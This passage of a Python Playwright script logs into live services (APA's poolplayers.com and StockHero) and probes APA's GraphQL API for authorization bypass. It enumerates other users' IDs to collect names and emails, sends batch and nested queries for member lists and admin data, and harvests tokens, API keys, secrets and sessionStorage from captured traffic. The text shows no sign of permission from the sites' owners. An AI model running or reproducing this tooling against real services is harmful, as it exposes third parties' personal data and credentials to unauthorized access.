                    CliOutput.warn(f"⚠️  ExternalStaff type: ACCESSIBLE (ID: {user_id}, Name: {first_name} {last_name})", indent=2)
                elif typename == "NationalOfficeStaff":
                    CliOutput.error(f"🔴 NationalOfficeStaff type: ACCESSIBLE! (ID: {user_id}, Name: {first_name} {last_name})", indent=2)
                else:
                    CliOutput.info(f"ℹ️  User type: {typename} (ID: {user_id})", indent=2)
            else:
                CliOutput.error("❌ Type union query failed - no response data", indent=2)
        except Exception as e:
            CliOutput.warn(f"Type union probing error: {e}", indent=2)
        
        # Test 3: Cross-User Access (try querying other user IDs)
        try:
            CliOutput.info("Testing cross-user data access (authorization bypass)...", indent=2)
            authz_bypass_results["cross_user_access"]["attempted"] = True
            
            # Try to access random user IDs
            test_user_ids = [1, 100, 999, 9999, 99999, 100000]
            vulnerable_count = 0
            
            for user_id in test_user_ids:
                cross_user_query = f"""
                {{
                  member(id: {user_id}) {{
                    id
                    firstName
                    lastName
                    emailAddress
                  }}
                }}
                """
                
                try:
                    response = await page.evaluate(f"""
                    async () => {{
                        const response = await fetch('{graphql_endpoint}', {{
                            method: 'POST',
                            headers: {{
                                'Authorization': 'Bearer {access_token}',
                                'Content-Type': 'application/json'
                            }},
                            body: JSON.stringify({{
                                query: `{cross_user_query}`
                            }})
                        }});
                        return await response.json();
                    }}
                    """)
                    
                    if isinstance(response, dict) and "data" in response:
                        data_obj = response.get("data", {})
                        member_data = data_obj.get("member") if isinstance(data_obj, dict) else None
                        if isinstance(member_data, dict) and member_data.get("id") == user_id:
                            vulnerable_count += 1
                            first_name = member_data.get("firstName", "N/A") if isinstance(member_data, dict) else "N/A"
                            last_name = member_data.get("lastName", "N/A") if isinstance(member_data, dict) else "N/A"
                            email = member_data.get("emailAddress", "N/A") if isinstance(member_data, dict) else "N/A"
                            CliOutput.error(f"🔴 VULNERABILITY: User {user_id} accessible ({first_name} {last_name} - {email})", indent=3)
                            
                            authz_bypass_results["cross_user_access"]["vulnerabilities"].append({
                                "severity": "CRITICAL",
                                "type": "Cross-User Data Access",
                                "user_id": user_id,
                                "accessible_fields": list(member_data.keys()),
                                "description": f"Able to access member data for user ID {user_id}"
                            })
                except Exception:
                    pass
            
            if vulnerable_count == 0:
                CliOutput.success(f"✅ Cross-user access: All {len(test_user_ids)} test user IDs blocked (secure)", indent=2)
            else:
                CliOutput.error(f"❌ {vulnerable_count} of {len(test_user_ids)} test user IDs were ACCESSIBLE", indent=2)
        except Exception as e:
            CliOutput.warn(f"Cross-user access test error: {e}", indent=2)
        
        # Test 4: Batch Query Enumeration
        try:
            CliOutput.info("Testing batch query enumeration...", indent=2)
            authz_bypass_results["batch_query_testing"]["attempted"] = True
            
            batch_queries_str = json.dumps([
                {"operationName": "viewerLeagues", "query": "{ viewer { leagues { id } } }"},
                {"operationName": "allMembers", "query": "{ members { id firstName } }"},
                {"operationName": "allUsers", "query": "{ users { id email } }"},
                {"operationName": "adminPanel", "query": "{ admin { info } }"},
            ])
            
            response = await page.evaluate(f"""
            async () => {{
                const response = await fetch('{graphql_endpoint}', {{
                    method: 'POST',
                    headers: {{
                        'Authorization': 'Bearer {access_token}',
                        'Content-Type': 'application/json'
                    }},
                    body: '{batch_queries_str}'.replace(/\\"/g, '"')
                }});
                return await response.json();
            }}
            """)
            
            batch_queries_list = [
                {"operationName": "viewerLeagues", "query": "{ viewer { leagues { id } } }"},
                {"operationName": "allMembers", "query": "{ members { id firstName } }"},
                {"operationName": "allUsers", "query": "{ users { id email } }"},
                {"operationName": "adminPanel", "query": "{ admin { info } }"},
            ]
            
            if isinstance(response, list) and len(response) > 0:
                successful_ops = 0
                for i, result in enumerate(response):
                    if isinstance(result, dict) and "data" in result and result.get("data"):
                        successful_ops += 1
                        if i < len(batch_queries_list) and isinstance(batch_queries_list[i], dict):
                            op_name = batch_queries_list[i].get("operationName")
                            CliOutput.warn(f"⚠️  Batch query '{op_name}' returned data", indent=3)
                            authz_bypass_results["batch_query_testing"]["results"].append({
                                "operation": op_name,
                                "success": True,
                                "data_returned": bool(result.get("data")) if isinstance(result, dict) else False
                            })
                
                if successful_ops > 0:
                    CliOutput.warn(f"⚠️  {successful_ops} of {len(batch_queries_list)} batch operations succeeded", indent=2)
                else:
                    CliOutput.success(f"✅ Batch queries: All {len(batch_queries_list)} operations properly blocked", indent=2)
            else:
                CliOutput.success(f"✅ Batch queries: Request denied or no response", indent=2)
        except Exception as e:
            CliOutput.warn(f"Batch query test error: {e}", indent=2)
        
        # Test 5: Deeply Nested Query Traversal
        try:
            CliOutput.info("Testing nested query traversal (viewer → leagues → members)...", indent=2)
            authz_bypass_results["nested_query_testing"]["attempted"] = True
            
            nested_query = """
            {
              viewer {
                leagues {
                  members {
                    id
                    emailAddress
                  }
                }
              }
            }
            """
            
            response = await page.evaluate(f"""
            async () => {{
                const response = await fetch('{graphql_endpoint}', {{
                    method: 'POST',
                    headers: {{
                        'Authorization': 'Bearer {access_token}',
                        'Content-Type': 'application/json'
                    }},
                    body: JSON.stringify({{
                        query: `{nested_query}`
                    }})
                }});
                return await response.json();
            }}
            """)
            
            if isinstance(response, dict) and "data" in response:
                data_obj = response.get("data", {})
                viewer = data_obj.get("viewer", {}) if isinstance(data_obj, dict) else {}
                leagues = viewer.get("leagues", []) if isinstance(viewer, dict) else []
                if isinstance(leagues, list) and len(leagues) > 0:
                    total_members = 0
                    for league in leagues:
                        members = league.get("members", []) if isinstance(league, dict) else []
                        total_members += len(members) if isinstance(members, list) else 0
                    
                    CliOutput.warn(f"⚠️  Nested traversal successful: Accessed {len(leagues)} leagues with {total_members} total members", indent=2)
                    authz_bypass_results["nested_query_testing"]["results"].append({
                        "query_type": "League Member Traversal",
                        "success": True,
                        "leagues_accessible": len(leagues),
                        "total_members_visible": total_members
                    })
                else:
                    CliOutput.success(f"✅ Nested query traversal: No league members accessible (secure)", indent=2)
            else:
                CliOutput.success(f"✅ Nested query: Request denied or no data returned", indent=2)
        except Exception as e:
            CliOutput.warn(f"Nested query test error: {e}", indent=2)
        
        # Summary assessment
        vulnerability_count = len(authz_bypass_results["cross_user_access"]["vulnerabilities"])
        introspection_enabled = authz_bypass_results["schema_introspection"]["enabled"]
        
        if vulnerability_count > 0:
            authz_bypass_results["security_findings"].append({
                "severity": "CRITICAL",
                "summary": f"{vulnerability_count} Authorization Bypass Vulnerabilities Found"
            })
        
        if introspection_enabled and not vulnerability_count:
            authz_bypass_results["security_findings"].append({
                "severity": "MEDIUM",
                "summary": "GraphQL Introspection is Enabled"
            })
        
    except Exception as e:
        CliOutput.warn(f"GraphQL authorization testing error: {e}", indent=2)
    
    return authz_bypass_results


# ================================================================================
# ================================================================================

async def login_to_apa(page, email, password):
    """Log into APA."""
    try:
        CliOutput.info(f"Logging in as {email}")
        await page.goto(APA_LOGIN_URL, timeout=60000)
        await page.wait_for_selector("body", timeout=30000)

        # Find email/password inputs
        email_input = None
        for sel in ["input[type='email']", "input[name='email']", "input#email"]:
            el = await page.query_selector(sel)
            if el:
                email_input = el
                break

        pwd_input = None
        for sel in ["input[type='password']", "input[name='password']", "input#password"]:
            el = await page.query_selector(sel)
            if el:
                pwd_input = el
                break

        if not email_input or not pwd_input:
            CliOutput.error("Could not find login fields")
            return False

        await email_input.fill(email)
        await pwd_input.fill(password)

        # Find and click login button
        btn = await page.query_selector("button[type='submit']")
        if not btn:
            # Try text search
            btns = await page.query_selector_all("button")
            for b in btns:
                txt = (await b.text_content() or "").lower()
                if "log in" in txt or "sign in" in txt:
                    btn = b
                    break

        if btn:
            await btn.click()
        
        await asyncio.sleep(5)

        # Click continue if present
        try:
            continue_btn = await page.query_selector("button:has-text('Continue')")
            if continue_btn:
                await continue_btn.click()
                await asyncio.sleep(3)
        except Exception:
            pass

        CliOutput.success("Login successful")
        return True
    except Exception as e:
        CliOutput.error(f"Login failed: {e}")
        return False


async def login_to_stockhero(page, email, password):
    """Log into StockHero."""
    try:
        CliOutput.info(f"Logging in to StockHero as {email}")
        await page.goto("https://app.stockhero.ai/login", timeout=60000)
        await page.wait_for_selector("body", timeout=30000)

        # Find email input
        email_input = None
        for sel in ["input[type='email']", "input[placeholder*='Email' i]"]:
            el = await page.query_selector(sel)
            if el:
                email_input = el
                break

        # Find password input
        pwd_input = None
        for sel in ["input[type='password']", "input[placeholder*='Password' i]"]:
            el = await page.query_selector(sel)
            if el:
                pwd_input = el
                break

        if not email_input or not pwd_input:
            CliOutput.error("Could not find StockHero login fields")
            return False

        await email_input.fill(email)
        await pwd_input.fill(password)

        # Find login button (StockHero uses "LOGIN NOW")
        btn = None
        button_selectors = [
            "button:has-text('LOGIN NOW')",
            "button:has-text('Login Now')",
            "button[type='submit']",
        ]
        
        for sel in button_selectors:
            try:
                btn = await page.query_selector(sel)
                if btn:
                    break
            except Exception:
                continue

        if btn:
            await btn.click()
            CliOutput.info(f"Clicked login button", indent=1)
        
        await asyncio.sleep(5)
        CliOutput.success("StockHero login successful")
        return True
    except Exception as e:
        CliOutput.error(f"StockHero login failed: {e}")
        return False


# ================================================================================
# API CAPTURE
# ================================================================================

async def is_login_page(page, site_type):
    """Heuristic: determine if the current page is a login page or shows a logged-out state."""
    try:
        cur = page.url or ""
        if "login" in cur.lower() or "sign-in" in cur.lower():
            return True

        # Look for common login form fields
        email_sel = await page.query_selector("input[type='email']")
        pwd_sel = await page.query_selector("input[type='password']")
        if email_sel and pwd_sel:
            return True
    except Exception:
        pass
    return False


async def ensure_logged_in(login_page, site_type, email, password, reauth_lock):
    """Ensure the shared login_page is logged in. Uses a lock to prevent concurrent relogs."""
    async with reauth_lock:
        try:
            # Double-check current state first
            if not await is_login_page(login_page, site_type):
                return True

            CliOutput.info("Detected logged-out state — re-authenticating...", indent=1)
            if site_type == "stockhero":
                ok = await login_to_stockhero(login_page, email, password)
            else:
                ok = await login_to_apa(login_page, email, password)

            if ok:
                CliOutput.success("Re-login successful", indent=1)
            else:
                CliOutput.error("Re-login failed", indent=1)
            return ok
        except Exception as e:
            CliOutput.error(f"Re-login exception: {e}", indent=1)
            return False


async def capture_page_apis(page, url, idx, total, login_page, site_type, email, password, reauth_lock):
    """Capture APIs and optional data from a single page."""
    global captured_apis, api_count

    CliOutput.status(f"[{idx + 1}/{total}] {url}")

    try:
        # Set up API listener and response collection
        apis_found = []
        apis_responses = []  # store Response objects for body retrieval
        network_data = {"requests": [], "errors": [], "websockets": []}
        client_data = {"console": [], "js_errors": [], "performance": {}, "state_snapshots": []}
        session_auth_data = {"tokens": [], "api_keys": [], "auth_headers": [], "session_storage": {}, "indexed_db": {}}
        page_behavior_data = {"interactions": [], "performance": {}, "a11y_issues": [], "third_party_scripts": []}
        content_extraction_data = {"structured_data": [], "rendered_text": "", "forms": [], "links": []}
        advanced_tracking_data = {"pixels": [], "cdn_headers": {}, "cors_requests": [], "security_headers": {}, "api_patterns": []}
        mode = CAPTURE_MODES[next(k for k, v in CAPTURE_MODES.items() if v["key"] == capture_mode)]

        def on_request(request):
            """Capture request data including headers and body."""
            if not mode.get("collect_network"):
                return
            try:
                req_url = request.url
                if not any(domain in req_url for domain in ["poolplayers.com", "api", "stockhero"]):
                    return
                
                req_data = {
                    "method": request.method,
                    "url": req_url,
                    "headers": dict(request.headers),
                    "timestamp": datetime.now().isoformat(),
                }
                
                # Capture POST/PUT body
                if request.method in ["POST", "PUT", "PATCH"]:
                    try:
                        if request.post_data:
                            req_data["body"] = request.post_data[:5000]  # First 5KB to avoid huge files
                    except Exception:
                        pass
                
                network_data["requests"].append(req_data)
            except Exception:
                pass

        def on_response(response):
            """Capture response data including headers, body, and timing."""
            try:
                ctype = response.headers.get("content-type", "").lower()
                req_url = response.url
                
                # Collect API metadata
                if mode["collect_apis"] and ("json" in ctype or "graphql" in response.url.lower() or "/api/" in response.url.lower()):
                    if any(domain in req_url for domain in ["poolplayers.com", "api", "stockhero"]):
                        api_entry = {
                            "method": response.request.method,
                            "url": response.url,
                            "status": response.status,
                            "response_headers": dict(response.headers),
                            "timestamp": datetime.now().isoformat(),
                        }
                        apis_found.append(api_entry)
                        apis_responses.append(response)
                
                # Track failed requests (4xx, 5xx) - log if network collection enabled
                if response.status >= 400 and mode.get("collect_network"):
                    error_entry = {
                        "method": response.request.method,
                        "url": response.url,
                        "status": response.status,
                        "status_text": f"{response.status}",
                        "timestamp": datetime.now().isoformat(),
                    }
                    network_data["errors"].append(error_entry)
                
                # Extract auth tokens and API keys if session/auth collection enabled
                if mode.get("collect_session_auth"):
                    try:
                        # Extract tokens from response headers (Authorization, X-Auth-Token, etc.)
                        for header_name, header_value in response.headers.items():
                            if any(auth_keyword in header_name.lower() for auth_keyword in ["authorization", "auth", "token", "x-auth", "x-api", "x-key"]):
                                token_entry = {
                                    "source": "response_header",
                                    "header": header_name,
                                    "value": header_value[:100] if len(str(header_value)) > 100 else header_value,
                                    "url": req_url,
                                    "timestamp": datetime.now().isoformat(),
                                }
                                session_auth_data["auth_headers"].append(token_entry)
                        
                        # Extract tokens from response body if JSON
                        if "json" in ctype:
                            try:
                                body_text = response.text() if hasattr(response, 'text') else None
                                if body_text:
                                    # Look for common token patterns (access_token, token, jwt, etc.)
                                    import re
                                    token_patterns = [
                                        r'"(access_token|token|jwt|auth_token|bearer_token)"\s*:\s*"([^"]{20,})"',
                                        r'"(Authorization|authorization)"\s*:\s*"([^"]{20,})"',
                                    ]
                                    for pattern in token_patterns:
                                        matches = re.findall(pattern, body_text[:10000])  # Check first 10KB
                                        for match_name, match_value in matches:
                                            token_entry = {
                                                "source": "response_body",
                                                "type": match_name,
                                                "value": match_value[:50],  # First 50 chars
                                                "url": req_url,
                                                "timestamp": datetime.now().isoformat(),
                                            }
                                            session_auth_data["tokens"].append(token_entry)
                                    
                                    # Look for API keys
                                    api_key_patterns = [
                                        r'"(api_key|apiKey|API_KEY)"\s*:\s*"([^"]{16,})"',
                                        r'"(secret|SECRET)"\s*:\s*"([^"]{16,})"',
                                    ]
                                    for pattern in api_key_patterns:
                                        matches = re.findall(pattern, body_text[:10000])
                                        for key_name, key_value in matches:
                                            session_auth_data["api_keys"].append({
                                                "type": key_name,
                                                "value": key_value[:30],
                                                "url": req_url,
                                                "timestamp": datetime.now().isoformat(),
                                            })
                            except Exception:
                                pass
                    except Exception:
                        pass
                
                # Collect images for download
                if mode.get("collect_images") and "image" in ctype:
                    apis_responses.append(response)
            except Exception:
                pass

        def on_websocket(websocket):
            """Capture WebSocket connections."""
            if not mode.get("collect_network"):
                return
            try:
                ws_data = {
                    "url": websocket.url,
                    "timestamp": datetime.now().isoformat(),
                }
                network_data["websockets"].append(ws_data)
            except Exception:
                pass

        def on_console(msg):
            """Capture console messages (logs, warnings, errors)."""
            if not mode.get("collect_client_intelligence"):
                return
            try:
                console_entry = {
                    "type": msg.type,  # log, error, warning, info, debug
                    "text": msg.text,
                    "location": msg.location,
                    "args": [],
                    "timestamp": datetime.now().isoformat(),
                }
                # Try to capture argument values if available
                if hasattr(msg, 'args') and msg.args:
                    for arg in msg.args[:5]:  # Limit to first 5 args
                        try:
                            console_entry["args"].append(str(arg))
                        except Exception:
                            pass
                client_data["console"].append(console_entry)
            except Exception:
                pass

        def on_page_error(exc):
            """Capture JavaScript exceptions."""
            if not mode.get("collect_client_intelligence"):
                return
            try:
                error_entry = {
                    "message": str(exc),
                    "stack": str(exc) if not hasattr(exc, 'stack') else exc.stack,
                    "timestamp": datetime.now().isoformat(),
                }
                client_data["js_errors"].append(error_entry)
            except Exception:
                pass

        page.on("request", on_request)
        page.on("response", on_response)
        page.on("websocket", on_websocket)
        if mode.get("collect_client_intelligence"):
            page.on("console", on_console)
            page.on("pageerror", on_page_error)

        # Load page with timeout and track performance
        load_start = time.time()
        await page.goto(url, timeout=30000, wait_until="networkidle")
        load_time = time.time() - load_start
        await asyncio.sleep(2)

        # If the page looks like a login page, attempt re-login using the shared login_page
        if await is_login_page(page, site_type):
            CliOutput.warn("Page redirected to login — attempting re-login", indent=1)
            ok = await ensure_logged_in(login_page, site_type, email, password, reauth_lock)
            if ok:
                # Retry once
                await page.goto(url, timeout=30000, wait_until="networkidle")
                await asyncio.sleep(2)
            else:
                CliOutput.error("Could not re-authenticate; skipping page.", indent=1)
                page.remove_listener("response", on_response)
                return

        # Capture page behavior data if enabled
        if mode.get("collect_page_behavior"):
            try:
                # Track user interactions (clicks, form fills, navigation)
                await page.evaluate("""() => {
                    window.__pageInteractions = {
                        clicks: 0,
                        formFills: 0,
                        navigationEvents: 0
                    };
                    
                    document.addEventListener('click', () => {
                        window.__pageInteractions.clicks++;
                    }, true);
                    
                    document.addEventListener('change', () => {
                        window.__pageInteractions.formFills++;
                    }, true);
                    
                    window.addEventListener('navigate', () => {
                        window.__pageInteractions.navigationEvents++;
                    }, true);
                }""")
            except Exception:
                pass
            
            try:
                # Capture third-party scripts and trackers
                scripts_info = await page.evaluate("""() => {
                    const scripts = [];
                    const internalDomain = window.location.hostname;
                    
                    Array.from(document.querySelectorAll('script[src]')).forEach(script => {
                        const src = script.getAttribute('src');
                        try {
                            const scriptUrl = new URL(src, window.location.href);
                            const isExternal = !scriptUrl.hostname.includes(internalDomain);
                            
                            scripts.push({
                                src: src,
                                external: isExternal,
                                async: script.hasAttribute('async'),
                                defer: script.hasAttribute('defer'),
                                type: script.getAttribute('type') || 'text/javascript'
                            });
                        } catch (e) {
                            scripts.push({ src: src, error: 'Invalid URL' });
                        }
                    });
                    
                    return scripts;
                }""")
                if scripts_info:
                    page_behavior_data["third_party_scripts"] = scripts_info
            except Exception:
                pass
            
            try:
                # Capture accessibility issues using ARIA and semantic HTML checks
                a11y_check = await page.evaluate("""() => {
                    const issues = [];
                    
                    // Check for missing alt text on images
                    document.querySelectorAll('img:not([alt])').forEach(img => {
                        issues.push({
                            type: 'missing_alt_text',
                            element: 'img',
                            url: img.src ? img.src.substring(0, 100) : 'unknown'
                        });
                    });
                    
                    // Check for missing form labels
                    document.querySelectorAll('input:not([aria-label])').forEach(input => {
                        if (!input.labels || input.labels.length === 0) {
                            issues.push({
                                type: 'missing_form_label',
                                element: 'input',
                                id: input.id || input.name || 'unnamed'
                            });
                        }
                    });
                    
                    // Check for missing headings
                    const headings = document.querySelectorAll('h1, h2, h3, h4, h5, h6');
                    if (headings.length === 0) {
                        issues.push({
                            type: 'no_headings',
                            description: 'Page has no heading structure'
                        });
                    }
                    
                    // Check for keyboard accessibility (focusable elements)
                    const focusable = document.querySelectorAll('button, a[href], input, select, textarea, [tabindex]');
                    if (focusable.length === 0) {
                        issues.push({
                            type: 'no_focusable_elements',
                            description: 'Page has no keyboard focusable elements'
                        });
                    }
                    
                    // Check for color contrast (basic check)
                    const textElements = document.querySelectorAll('p, span, h1, h2, h3, h4, h5, h6');
                    let lowContrastCount = 0;
                    textElements.forEach(el => {
                        const style = window.getComputedStyle(el);
                        if (style.opacity < 0.5) {
                            lowContrastCount++;
                        }
                    });
                    if (lowContrastCount > 0) {
                        issues.push({
                            type: 'potential_contrast_issues',
                            count: lowContrastCount
                        });
                    }
                    
                    return { issues, count: issues.length };
                }""")
                if a11y_check:
                    page_behavior_data["a11y_issues"] = a11y_check.get("issues", [])
            except Exception:
                pass
            
            try:
                # Capture performance metrics for page behavior
                perf_data = await page.evaluate("""() => {
                    const perfData = {};
                    
                    // Paint timing
                    if (window.performance && window.performance.getEntriesByType) {
                        const paintEntries = window.performance.getEntriesByType('paint');
                        paintEntries.forEach(entry => {
                            perfData[entry.name] = entry.startTime.toFixed(2) + 'ms';
                        });
                    }
                    
                    // Resource count
                    if (window.performance && window.performance.getEntriesByType) {
                        const resources = window.performance.getEntriesByType('resource');
                        perfData.total_resources = resources.length;
                        
                        let totalSize = 0;
                        let scriptSize = 0;
                        let styleSize = 0;
                        let imageSize = 0;
                        
                        resources.forEach(res => {
                            if (res.transferSize) totalSize += res.transferSize;
                            if (res.initiatorType === 'script') scriptSize += res.transferSize || 0;
                            if (res.initiatorType === 'link') styleSize += res.transferSize || 0;
                            if (res.initiatorType === 'img') imageSize += res.transferSize || 0;
                        });
                        
                        perfData.total_size_kb = (totalSize / 1024).toFixed(2);
                        perfData.script_size_kb = (scriptSize / 1024).toFixed(2);
                        perfData.style_size_kb = (styleSize / 1024).toFixed(2);
                        perfData.image_size_kb = (imageSize / 1024).toFixed(2);
                    }
                    
                    return perfData;
                }""")
                if perf_data:
                    page_behavior_data["performance"] = perf_data
            except Exception:
                pass

        # Capture performance metrics and state if client intelligence enabled
        if mode.get("collect_client_intelligence"):
            try:
                # Capture Core Web Vitals and performance metrics
                perf_metrics = await page.evaluate("""() => {
                    const metrics = {};
                    
                    // Core Web Vitals
                    if (window.pageSpeedInsights) {
                        metrics.lcp = window.pageSpeedInsights.lcp;
                        metrics.fid = window.pageSpeedInsights.fid;
                        metrics.cls = window.pageSpeedInsights.cls;
                    }
                    
                    // Navigation Timing
                    if (window.performance && window.performance.timing) {
                        const timing = window.performance.timing;
                        metrics.dns_time = timing.domainLookupEnd - timing.domainLookupStart;
                        metrics.tcp_time = timing.connectEnd - timing.connectStart;
                        metrics.ttfb = timing.responseStart - timing.navigationStart;
                        metrics.dom_interactive = timing.domInteractive - timing.navigationStart;
                        metrics.dom_complete = timing.domComplete - timing.navigationStart;
                        metrics.load_time = timing.loadEventEnd - timing.navigationStart;
                    }
                    
                    // Memory (if available)
                    if (window.performance && window.performance.memory) {
                        metrics.heap_used = window.performance.memory.usedJSHeapSize;
                        metrics.heap_limit = window.performance.memory.jsHeapSizeLimit;
                    }
                    
                    return metrics;
                }""")
                client_data["performance"] = perf_metrics
            except Exception:
                pass
            
            try:
                # Capture Redux/state snapshots
                state_snapshot = await page.evaluate("""() => {
                    const snapshots = {};
                    
                    // Redux store
                    if (window.__REDUX_DEVTOOLS_EXTENSION_COMPOSE__) {
                        snapshots.redux = "Redux detected";
                    }
                    
                    // Look for global state objects
                    if (window.__store) {
                        snapshots.global_store = typeof window.__store.getState === 'function' ? 
                            window.__store.getState() : window.__store;
                    }
                    
                    // Zustand stores (common pattern)
                    if (window.useStore && typeof window.useStore.getState === 'function') {
                        snapshots.zustand = window.useStore.getState();
                    }
                    
                    return snapshots;
                }""")
                if state_snapshot:
                    client_data["state_snapshots"].append({
                        "timestamp": datetime.now().isoformat(),
                        "data": state_snapshot
                    })
            except Exception:
                pass
        
        # Capture session/auth data if enabled
        if mode.get("collect_session_auth"):
            try:
                # Capture sessionStorage
                session_storage = await page.evaluate("""() => {
                    const storage = {};
                    try {
                        for (let i = 0; i < sessionStorage.length; i++) {
                            const key = sessionStorage.key(i);
                            const value = sessionStorage.getItem(key);
                            storage[key] = value;
                        }
                    } catch (e) {}
                    return storage;
                }""")
                if session_storage:
                    session_auth_data["session_storage"] = session_storage
            except Exception:
                pass
            
            try:
                # Capture IndexedDB databases and stores
                indexed_db_data = await page.evaluate("""() => {
                    const dbData = {};
                    if (!window.indexedDB) return dbData;
                    
                    try {
                        const dbs = await indexedDB.databases();
                        if (dbs && dbs.length > 0) {
                            dbData.databases = dbs.map(db => db.name);
                            dbData.count = dbs.length;
                        }
                    } catch (e) {
                        dbData.error = "Could not access IndexedDB";
                    }
                    return dbData;
                }""")
                if indexed_db_data:
                    session_auth_data["indexed_db"] = indexed_db_data
            except Exception:
                pass

        # Capture user interactions if page behavior tracking enabled
        if mode.get("collect_page_behavior"):
            try:
                interactions = await page.evaluate("""() => {
                    return window.__pageInteractions || {
                        clicks: 0,
                        formFills: 0,
                        navigationEvents: 0
                    };
                }""")
                if interactions:
                    page_behavior_data["interactions"] = interactions
            except Exception:
                pass

        # Capture content extraction data if enabled
        if mode.get("collect_content_extraction"):
            try:
                # Extract JSON-LD and microdata
                structured_data = await page.evaluate("""() => {
                    const data = [];
                    
                    // JSON-LD extraction
                    const scripts = document.querySelectorAll('script[type="application/ld+json"]');
                    scripts.forEach(script => {
                        try {
                            const parsed = JSON.parse(script.textContent);
                            data.push({
                                type: 'json-ld',
                                schema_type: parsed['@type'] || 'unknown',
                                data: parsed
                            });
                        } catch (e) {
                            data.push({
                                type: 'json-ld',
                                error: 'Parse failed',
                                raw: script.textContent.substring(0, 200)
                            });
                        }
                    });
                    
                    // Microdata extraction (itemscope elements)
                    const microdata = [];
                    document.querySelectorAll('[itemscope]').forEach(el => {
                        const itemtype = el.getAttribute('itemtype');
                        const itemprops = [];
                        el.querySelectorAll('[itemprop]').forEach(prop => {
                            itemprops.push({
                                name: prop.getAttribute('itemprop'),
                                content: prop.textContent.substring(0, 100) || prop.getAttribute('content')
                            });
                        });
                        microdata.push({
                            itemtype: itemtype,
                            properties: itemprops
                        });
                    });
                    
                    if (microdata.length > 0) {
                        data.push({
                            type: 'microdata',
                            items: microdata
                        });
                    }
                    
                    return data;
                }""")
                if structured_data:
                    content_extraction_data["structured_data"] = structured_data
            except Exception:
                pass
            
            try:
                # Capture rendered text content (excluding scripts/styles)
                rendered_text = await page.evaluate("""() => {
                    // Clone body to avoid affecting original DOM
                    const clone = document.body.cloneNode(true);
                    
                    // Remove script and style tags
                    clone.querySelectorAll('script, style, noscript').forEach(el => el.remove());
                    
                    // Get all text and normalize
                    const text = clone.textContent
                        .split('\\n')
                        .map(line => line.trim())
                        .filter(line => line.length > 0)
                        .join('\\n');
                    
                    return text.substring(0, 5000); // First 5000 chars of rendered text
                }""")
                if rendered_text:
                    content_extraction_data["rendered_text"] = rendered_text
            except Exception:
                pass
            
            try:
                # Extract form fields and inputs
                forms_data = await page.evaluate("""() => {
                    const forms = [];
                    
                    document.querySelectorAll('form').forEach((form, formIdx) => {
                        const formData = {
                            id: form.id || 'form_' + formIdx,
                            action: form.action,
                            method: form.method || 'GET',
                            fields: []
                        };
                        
                        // Extract all inputs, selects, textareas
                        form.querySelectorAll('input, select, textarea').forEach(field => {
                            const fieldInfo = {
                                type: field.tagName.toLowerCase(),
                                name: field.name || field.id,
                                inputType: field.type,
                                label: field.previousElementSibling?.textContent || '',
                                required: field.hasAttribute('required'),
                                placeholder: field.placeholder
                            };
                            
                            // For select fields, capture options
                            if (field.tagName === 'SELECT') {
                                fieldInfo.options = Array.from(field.options).map(opt => ({
                                    value: opt.value,
                                    text: opt.text
                                }));
                            }
                            
                            formData.fields.push(fieldInfo);
                        });
                        
                        if (formData.fields.length > 0) {
                            forms.push(formData);
                        }
                    });
                    
                    return forms;
                }""")
                if forms_data:
                    content_extraction_data["forms"] = forms_data
            except Exception:
                pass
            
            try:
                # Extract and organize links by type
                links_data = await page.evaluate("""() => {
                    const links = {
                        internal: [],
                        external: [],
                        ctas: [],
                        navigation: []
                    };
                    
                    const internalDomain = window.location.hostname;
                    const anchorTags = document.querySelectorAll('a[href]');
                    
                    anchorTags.forEach(link => {
                        const href = link.getAttribute('href');
                        if (!href) return;
                        
                        const linkInfo = {
                            text: link.textContent.substring(0, 100),
                            href: href,
                            title: link.title,
                            target: link.target || '_self',
                            class: link.className
                        };
                        
                        // Categorize links
                        try {
                            const url = new URL(href, window.location.href);
                            const isExternal = !url.hostname.includes(internalDomain);
                            
                            if (isExternal || href.startsWith('http')) {
                                links.external.push(linkInfo);
                            } else {
                                links.internal.push(linkInfo);
                            }
                            
                            // Detect CTAs (buttons styled as links, common CTA classes)
                            if (link.className.includes('btn') || link.className.includes('button') ||
                                link.className.includes('cta') || link.textContent.toLowerCase().includes('sign up') ||
                                link.textContent.toLowerCase().includes('buy') ||
                                link.textContent.toLowerCase().includes('subscribe')) {
                                links.ctas.push(linkInfo);
                            }
                            
                            // Detect navigation links (in nav elements or common nav classes)
                            if (link.closest('nav') || link.className.includes('nav') ||
                                link.className.includes('menu') || link.className.includes('header')) {
                                links.navigation.push(linkInfo);
                            }
                        } catch (e) {
                            links.internal.push(linkInfo);
                        }
                    });
                    
                    return links;
                }""")
                if links_data:
                    content_extraction_data["links"] = links_data
            except Exception:
                pass

        # Capture advanced tracking data if enabled
        if mode.get("collect_advanced_tracking"):
            try:
                # Capture analytics pixels and tracking calls
                tracking_data = await page.evaluate("""() => {
                    const pixels = [];
                    
                    // Check for tracking pixels (img tags with tracking URLs)
                    document.querySelectorAll('img').forEach(img => {
                        const src = img.src.toLowerCase();
                        const isTracking = src.includes('pixel') || src.includes('track') || 
                                         src.includes('analytics') || src.includes('beacon') ||
                                         src.includes('gif') && src.length < 200; // tiny GIFs often tracking
                        
                        if (isTracking && src.startsWith('http')) {
                            pixels.push({
                                type: 'pixel',
                                src: src,
                                width: img.width,
                                height: img.height
                            });
                        }
                    });
                    
                    // Check for tracking script domains
                    const trackedScripts = [];
                    document.querySelectorAll('script[src]').forEach(script => {
                        const src = script.src.toLowerCase();
                        const isTracking = src.includes('google') || src.includes('analytics') ||
                                         src.includes('facebook') || src.includes('twitter') ||
                                         src.includes('hotjar') || src.includes('mixpanel') ||
                                         src.includes('amplitude') || src.includes('segment') ||
                                         src.includes('gtag') || src.includes('track');
                        
                        if (isTracking) {
                            pixels.push({
                                type: 'tracking_script',
                                src: src
                            });
                        }
                    });
                    
                    return pixels;
                }""")
                if tracking_data:
                    advanced_tracking_data["pixels"] = tracking_data
            except Exception:
                pass
            
            try:
                # Capture response headers for CDN and caching info
                cdn_headers_map = {}
                cdn_patterns = {
                    'cache_control': 'cache-control',
                    'etag': 'etag',
                    'x_cache': 'x-cache',
                    'cf_cache_status': 'cf-cache-status',
                    'x_amz_cf_cache_status': 'x-amz-cf-cache-status',
                    'content_delivery_network': 'server'
                }
                # This will be filled from network responses below
                advanced_tracking_data["cdn_headers"] = cdn_headers_map
            except Exception:
                pass
            
            try:
                # Capture CORS information from requests
                cors_info = await page.evaluate("""() => {
                    const corsRequests = [];
                    
                    // Try to get from performance API if available
                    if (window.performance && window.performance.getEntriesByType) {
                        const resources = window.performance.getEntriesByType('resource');
